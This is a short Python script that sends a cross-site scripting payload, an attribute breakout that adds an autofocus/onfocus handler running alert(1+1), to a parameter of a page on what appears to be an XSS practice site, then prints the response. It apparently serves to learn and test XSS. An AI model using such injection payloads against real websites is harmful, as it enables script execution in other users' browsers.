#!/usr/bin/python3
import requests

url = 'https://brutelogic.com.br/gym.php'

payload = "'autofocus/onfocus='alert(1+1)"

params = {'p09': payload}

r = requests.get(url, params=params)

print(r.text)
print(r.url)
